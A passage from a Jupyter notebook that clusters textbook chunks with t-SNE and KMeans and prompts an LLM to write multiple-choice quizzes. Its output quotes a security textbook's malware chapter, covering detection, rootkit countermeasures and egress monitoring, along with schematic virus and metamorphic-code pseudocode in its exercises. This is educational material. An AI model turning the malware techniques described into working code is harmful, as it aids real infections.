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",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from sklearn.manifold import TSNE\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "# Taking out the warnings\n",
    "import warnings\n",
    "from warnings import simplefilter\n",
    "\n",
    "# Filter out FutureWarnings\n",
    "simplefilter(action='ignore', category=FutureWarning)\n",
    "\n",
    "# Perform t-SNE and reduce to 2 dimensions\n",
    "tsne = TSNE(n_components=2, random_state=42)\n",
    "reduced_data_tsne = tsne.fit_transform(vectors)\n",
    "\n",
    "# Plot the reduced data\n",
    "plt.scatter(reduced_data_tsne[:, 0], reduced_data_tsne[:, 1], c=kmeans.labels_)\n",
    "plt.xlabel('Dimension 1')\n",
    "plt.ylabel('Dimension 2')\n",
    "plt.title('Book Embeddings Clustered')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "closest_indices: [60, 49, 31]\n",
      "labels_dict: {0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0, 8: 0, 9: 0, 10: 0, 11: 0, 12: 0, 13: 0, 14: 0, 15: 0, 16: 0, 17: 0, 18: 0, 19: 0, 20: 0, 21: 0, 22: 0, 23: 0, 24: 0, 25: 2, 26: 2, 27: 2, 28: 2, 29: 2, 30: 2, 31: 2, 32: 2, 33: 2, 34: 2, 35: 2, 36: 2, 37: 2, 38: 2, 39: 2, 40: 2, 41: 2, 42: 2, 43: 2, 44: 2, 45: 2, 46: 1, 47: 1, 48: 1, 49: 1, 50: 1, 51: 1, 52: 1, 53: 1, 54: 1, 55: 1, 56: 0, 57: 1, 58: 0, 59: 0, 60: 0, 61: 0, 62: 0, 63: 0, 64: 0, 65: 0, 66: 0, 67: 0}\n",
      "labels: [0, 1, 2]\n"
     ]
    }
   ],
   "source": [
    "# Find the closest embeddings to the centroids\n",
    "\n",
    "# Create an empty list that will hold your closest points\n",
    "closest_indices = []\n",
    "\n",
    "# Loop through the number of clusters you have\n",
    "for i in range(num_clusters):\n",
    "    \n",
    "    # Get the list of distances from that particular cluster center\n",
    "    distances = np.linalg.norm(vectors - kmeans.cluster_centers_[i], axis=1)\n",
    "    \n",
    "    # Find the list position of the closest one (using argmin to find the smallest distance)\n",
    "    closest_index = np.argmin(distances)\n",
    "    \n",
    "    # Append that position to your closest indices list\n",
    "    closest_indices.append(closest_index)\n",
    "\n",
    "# Print the indices of the closest embeddings to the centroids\n",
    "print(f\"closest_indices: {closest_indices}\")\n",
    "print(f\"labels_dict: {labels_dict}\")\n",
    "print(f\"labels: {[labels_dict[index] for index in closest_indices]}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[31, 49, 60]"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "selected_indices = sorted(closest_indices)\n",
    "selected_indices"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'str'>\n"
     ]
    }
   ],
   "source": [
    "from langchain.docstore.document import Document\n",
    "\n",
    "print(type(documents[0]))\n",
    "selected_docs = [Document(page_content=documents[index]) for index in selected_indices]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of questions is larger than the number of clusters, so we will use 3 questions.\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "from langchain.chains.summarize import load_summarize_chain\n",
    "from langchain import PromptTemplate\n",
    "from langchain.callbacks import get_openai_callback\n",
    "\n",
    "n_questions = 5\n",
    "if len(selected_docs) < n_questions:\n",
    "    n_questions = len(selected_docs)\n",
    "    print(f\"The number of questions is larger than the number of clusters, so we will use {n_questions} questions.\")\n",
    "else:\n",
    "    print(f\"The number of questions is {n_questions}.\")\n",
    "\n",
    "# templete = \"\"\"\n",
    "# Extract key points which can help students revise from the following text delimited by triple backquotes.\n",
    "# Return your response in bullet points which covers the key points of the text.\n",
    "# ```{text}```\n",
    "# BULLET POINT SUMMARY:\n",
    "# \"\"\"\n",
    "\n",
    "template = \"\"\"\n",
    "Using the content provided below from a PDF delimited by triple backquotes, \n",
    "please generate a multiple-choice test consisting of {n_questions} questions to aid students in their review. \n",
    "Each question should be related to the key concepts, facts, or information in the text, and following the specific format below:\n",
    "Begin each question with the word \"Question\" and a number, followed by a colon.\n",
    "Then, provide the options for the question beginning with the word \"Options\" and a colon.\n",
    "Ensure that for each question, there is one correct answer and three plausible but incorrect options. \n",
    "End each question with the word \"Answer\" and a colon, followed by the correct answer.\n",
    "\n",
    "```{text}```\n",
    "\"\"\"\n",
    "# print(f\"lem template: {len(template)}\")\n",
    "template = re.sub(r\"{n_questions}\", str(n_questions), template)\n",
    "\n",
    "prompt = PromptTemplate(\n",
    "    input_variables=[\"text\"],\n",
    "    template=template,\n",
    ")\n",
    "\n",
    "summary_chain = load_summarize_chain(llm, \n",
    "                                     chain_type=\"stuff\", \n",
    "                                     prompt=prompt, \n",
    "                                     verbose=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing document ...\n",
      "This doc has 4000 tokens.\n",
      "This doc has 18082 characters. 4.5205 characters per token.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Callback: \n",
      "Tokens Used: 11889\n",
      "\tPrompt Tokens: 11659\n",
      "\tCompletion Tokens: 230\n",
      "Successful Requests: 1\n",
      "Total Cost (USD): $0.012119000000000001\n",
      "Summary is: {'input_documents': [Document(page_content='240 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nvirtualized environment, and suppresses malicious behavior if so. Other malware \\r\\nincludes extended sleep periods before engaging in malicious activity, in an attempt \\r\\nto evade detection before the analysis terminates. Or the malware may include a logic \\r\\nbomb looking for a specific date, or specific system type or network location before \\r\\nengaging in malicious activity, which the sandbox environment does not match. In \\r\\nresponse, analysts adapt their sandbox environments to attempt to evade these tests. \\r\\nThis race continues.\\r\\nHOST-BASED DYNAMIC MALWARE ANALYSIS Unlike heuristics or fingerprint-based \\r\\nscanners, dynamic malware analysis or behavior-blocking software integrates with the \\r\\noperating system of a host computer and monitors program behavior in real time for \\r\\nmalicious actions [CONR02, EGEL12]. It is a type of host-based intrusion preven\\ufffetion system, which we will discuss further in Section 9.6. This software monitors the \\r\\nbehavior of possibly malicious code, looking for potentially malicious actions, similar \\r\\nto the sandbox systems we discussed in the previous section. However, it then has \\r\\nthe capability to block malicious actions before they can affect the target system. \\r\\nMonitored behaviors can include the following:\\r\\n• Attempts to open, view, delete, and/or modify files\\r\\n• Attempts to format disk drives and other unrecoverable disk operations\\r\\n• Modifications to the logic of executable files or macros\\r\\n• Modification of critical system settings, such as start-up settings\\r\\n• Scripting of e-mail and instant messaging clients to send executable content\\r\\n• Initiation of network communications\\r\\nBecause dynamic analysis software can block suspicious software in real time, it has \\r\\nan advantage over such established anti-virus detection techniques as fingerprinting \\r\\nor heuristics. There are literally trillions of different ways to obfuscate and rearrange \\r\\nthe instructions of a virus or worm, many of which will evade detection by a finger\\ufffeprint scanner or heuristic. But eventually, malicious code must make a well-defined \\r\\nrequest to the operating system. Given that the behavior blocker can intercept all \\r\\nsuch requests, it can identify and block malicious actions regardless of how obfuscated \\r\\nthe program logic appears to be.\\r\\nDynamic analysis alone has limitations. Because the malicious code must run on \\r\\nthe target machine before all its behaviors can be identified, it can cause harm before \\r\\nit has been detected and blocked. For example, a new item of malware might shuffle \\r\\na number of seemingly unimportant files around the hard drive before modifying a \\r\\nsingle file and being blocked. Even though the actual modification was blocked, the \\r\\nuser may be unable to locate his or her files, causing a loss to productivity or possibly \\r\\nworse.\\r\\nSPYWARE DETECTION AND REMOVAL Although general anti-virus products include \\r\\nsignatures to detect spyware, the threat this type of malware poses, and its use of \\r\\nstealthing techniques, means that a range of spyware specific detection and removal \\r\\nutilities exist. These specialize in the detection and removal of spyware, and provide \\r\\nmore robust capabilities. Thus they complement, and should be used along with, more \\r\\ngeneral anti-virus products.\\r\\nM06_STAL0611_04_GE_C06.indd 240 10/11/17 2:51 PM\\n\\n\\n6.10 / COUNTERMEASURES 241\\r\\nROOTKIT COUNTERMEASURES Rootkits can be extraordinarily difficult to detect and \\r\\nneutralize, particularly so for kernel-level rootkits. Many of the administrative tools \\r\\nthat could be used to detect a rootkit or its traces can be compromised by the rootkit \\r\\nprecisely so it is undetectable.\\r\\nCountering rootkits requires a variety of network- and computer-level security \\r\\ntools. Both network-based and host-based IDSs can look for the code signatures of \\r\\nknown rootkit attacks in incoming traffic. Host-based anti-virus software can also be \\r\\nused to recognize the known signatures.\\r\\nOf course, there are always new rootkits and modified versions of existing \\r\\nrootkits that display novel signatures. For these cases, a system needs to look for \\r\\nbehaviors that could indicate the presence of a rootkit, such as the interception of \\r\\nsystem calls or a keylogger interacting with a keyboard driver. Such behavior detec\\ufffetion is far from straightforward. For example, anti-virus software typically intercepts \\r\\nsystem calls.\\r\\nAnother approach is to do some sort of file integrity check. An example of \\r\\nthis is RootkitRevealer, a freeware package from SysInternals. The package com\\ufffepares the results of a system scan using APIs with the actual view of storage using \\r\\ninstructions that do not go through an API. Because a rootkit conceals itself by \\r\\nmodifying the view of storage seen by administrator calls, RootkitRevealer catches \\r\\nthe discrepancy.\\r\\nIf a kernel-level rootkit is detected, the only secure and reliable way to recover \\r\\nis to do an entire new OS install on the infected machine.\\r\\nPerimeter Scanning Approaches\\r\\nThe next location where anti-virus software is used is on an organization’s firewall \\r\\nand IDS. It is typically included in e-mail and Web proxy services running on these \\r\\nsystems. It may also be included in the traffic analysis component of an IDS. This gives \\r\\nthe anti-virus software access to malware in transit over a network connection to any \\r\\nof the organization’s systems, providing a larger scale view of malware activity. This \\r\\nsoftware may also include intrusion prevention measures, blocking the flow of any \\r\\nsuspicious traffic, thus preventing it reaching and compromising some target system, \\r\\neither inside or outside the organization.\\r\\nHowever, this approach is limited to scanning the malware content, as it does \\r\\nnot have access to any behavior observed when it runs on an infected system. Two \\r\\ntypes of monitoring software may be used:\\r\\n• Ingress monitors: These are located at the border between the enterprise net\\ufffework and the Internet. They can be part of the ingress filtering software of a \\r\\nborder router or external firewall or a separate passive monitor. These monitors \\r\\ncan use either anomaly or signature and heuristic approaches to detect malware \\r\\ntraffic, as we will discuss further in Chapter 8. A honeypot can also capture \\r\\nincoming malware traffic. An example of a detection technique for an ingress \\r\\nmonitor is to look for incoming traffic to unused local IP addresses.\\r\\n• Egress monitors: These can be located at the egress point of individual LANs on \\r\\nthe enterprise network as well as at the border between the enterprise network \\r\\nand the Internet. In the former case, the egress monitor can be part of the egress \\r\\nM06_STAL0611_04_GE_C06.indd 241 10/11/17 2:51 PM\\n\\n\\n242 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nfiltering software of a LAN router or switch. As with ingress monitors, the exter\\ufffenal firewall or a honeypot can house the monitoring software. Indeed, the two \\r\\ntypes of monitors can be installed in one device. The egress monitor is designed \\r\\nto catch the source of a malware attack by monitoring outgoing traffic for signs \\r\\nof scanning or other suspicious behavior. This monitoring could look for the \\r\\ncommon sequential or random scanning behavior used by worms and rate limit \\r\\nor block it. It may also be able to detect and respond to abnormally high e-mail \\r\\ntraffic such as that used by mass e-mail worms, or spam payloads. It may also \\r\\nimplement data exfiltration “data-loss” technical counter measures, monitoring \\r\\nfor unauthorized transmission of sensitive information out of the organization.\\r\\nPerimeter monitoring can also assist in detecting and responding to botnet activity \\r\\nby detecting abnormal traffic patterns associated with this activity. Once bots are \\r\\nactivated and an attack is underway, such monitoring can be used to detect the attack. \\r\\nHowever, the primary objective is to try to detect and disable the botnet during its \\r\\nconstruction phase, using the various scanning techniques we have just discussed, \\r\\nidentifying and blocking the malware that is used to propagate this type of payload.\\r\\nDistributed Intelligence Gathering Approaches\\r\\nThe final location where anti-virus software is used is in a distributed configuration. \\r\\nIt gathers data from a large number of both host-based and perimeter sensors, relays \\r\\nthis intelligence to a central analysis system able to correlate and analyze the data, \\r\\nwhich can then return updated signatures and behavior patterns to enable all of the \\r\\ncoordinated systems to respond and defend against malware attacks. A number of \\r\\nsuch systems have been proposed. This is a specific example of a distributed intru\\ufffesion prevention system (IPS), targeting malware, which we will discuss further in \\r\\nSection 9.6.\\r\\n6.11 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\nadvanced persistent threat\\r\\nadware\\r\\nattack kit\\r\\nbackdoor\\r\\nblended attack\\r\\nboot-sector infector\\r\\nbot\\r\\nbotnet\\r\\ncrimeware\\r\\ndata exfiltration\\r\\ndownloader\\r\\ndrive-by-download\\r\\ne-mail virus\\r\\ninfection vector\\r\\nkeyloggers\\r\\nlogic bomb\\r\\nmacro virus\\r\\nmalicious software\\r\\nmalware\\r\\nmetamorphic virus\\r\\nmobile code\\r\\nparasitic virus\\r\\npayload\\r\\nphishing\\r\\npolymorphic virus\\r\\npropagate\\r\\nransomware\\r\\nrootkit\\r\\nscanning\\r\\nspear-phishing\\r\\nspyware\\r\\nstealth virus\\r\\ntrapdoor\\r\\nTrojan horse\\r\\nvirus\\r\\nwatering-hole attack\\r\\nworm\\r\\nzombie\\r\\nzero-day exploit\\r\\nM06_STAL0611_04_GE_C06.indd 242 10/11/17 2:51 PM\\n\\n\\n6.11 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 243\\r\\nReview Questions\\r\\n6.1 What are three broad mechanisms that malware can use to propagate?\\r\\n6.2 What are four broad categories of payloads that malware may carry?\\r\\n6.3 What characteristics of an advanced persistent threat give it that name?\\r\\n6.4 What are typical phases of operation of a virus or worm?\\r\\n6.5 What is a blended attack?\\r\\n6.6 What is the difference between a worm and a zombie?\\r\\n6.7 What does “fingerprinting” mean for network worms?\\r\\n6.8 What is a “drive-by-download” and how does it differ from a worm?\\r\\n6.9 How does a Trojan enable malware to propagate? How common are Trojans on \\r\\ncomputer systems? Or on mobile platforms?\\r\\n6.10 What is a “logic bomb”?\\r\\n6.11 What is the difference between a backdoor, a bot, a keylogger, spyware, and a rootkit? \\r\\nCan they all be present in the same malware?\\r\\n6.12 What is the difference between a “phishing” attack and a “spear-phishing” attack, \\r\\nparticularly in terms of who the target may be?\\r\\n6.13 What is a clickjacking vulnerability?\\r\\n6.14 List a few characteristics to classify rootkits.\\r\\n6.15 Briefly describe the elements of a GD scanner.\\r\\n6.16 Describe some rootkit countermeasures.\\r\\nProblems\\r\\n6.1 A computer virus places a copy of itself into other programs, and arranges for that \\r\\ncode to be run when the program executes. The “simple” approach just appends \\r\\nthe code after the existing code, and changes the address where code execution \\r\\nstarts. This will clearly increase the size of the program, which is easily observed. \\r\\nInvestigate and briefly list some other approaches that do not change the size of the \\r\\nprogram.\\r\\n6.2 The question arises as to whether it is possible to develop a program that can analyze \\r\\na piece of software to determine if it is a virus. Consider that we have a program D \\r\\nthat is supposed to be able to do that. That is, for any program P, if we run D(P), the \\r\\nresult returned is TRUE (P is a virus) or FALSE (P is not a virus). Now consider the \\r\\nfollowing program:\\r\\nProgram CV :=\\r\\n {. . .\\r\\n main-program :=\\r\\n {if D(CV) then goto next:\\r\\n else infect-executable;\\r\\n }\\r\\nnext:\\r\\n }\\r\\n In the preceding program, infect-executable is a module that scans memory for exe\\ufffecutable programs and replicates itself in those programs. Determine if D can correctly \\r\\ndecide whether CV is a virus.\\r\\n6.3 The following code fragments show a sequence of virus instructions and a metamor\\ufffephic version of the virus. Describe the effect produced by the metamorphic code.\\r\\nM06_STAL0611_04_GE_C06.indd 243 10/11/17 2:51 PM\\n\\n\\n244 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nOriginal Code Metamorphic Code\\r\\nmov eax, 5 mov eax, 5\\r\\nadd eax, ebx push ecx\\r\\ncall [eax] pop ecx\\r\\nadd eax, ebx\\r\\nswap eax, ebx\\r\\nswap ebx, eax\\r\\ncall [eax]\\r\\nnop\\r\\n6.4 The list of passwords used by the Morris worm is provided at this book’s website.\\r\\na. The assumption has been expressed by many people that this list represents words \\r\\ncommonly used as passwords. Does this seem likely? Justify your answer.\\r\\nb. If the list does not reflect commonly used passwords, suggest some approaches \\r\\nthat Morris may have used to construct the list.\\r\\n6.5 Consider the following fragment:\\r\\nlegitimate code\\r\\nif an infected document is opened;\\r\\n trigger_code_to_infect_other_documents();\\r\\nlegitimate code\\r\\nWhat type of malware is this?\\r\\n6.6 Consider the following fragment embedded in a webpage:\\r\\nusername = read_username();\\r\\npassword = read_password();\\r\\nif username and password are 